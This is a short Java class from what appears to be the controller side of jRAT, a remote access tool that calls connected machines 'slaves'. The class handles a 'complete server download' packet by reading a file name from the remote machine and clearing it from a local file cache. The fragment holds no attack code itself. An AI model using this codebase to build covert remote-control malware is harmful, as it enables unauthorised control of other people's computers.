package se.jrat.client.packets.incoming;

import java.io.DataInputStream;

import se.jrat.client.Slave;
import se.jrat.common.io.FileCache;


public class Packet31CompleteServerDownload extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		String file = slave.readLine();
		FileCache.clear(file);
	}

}
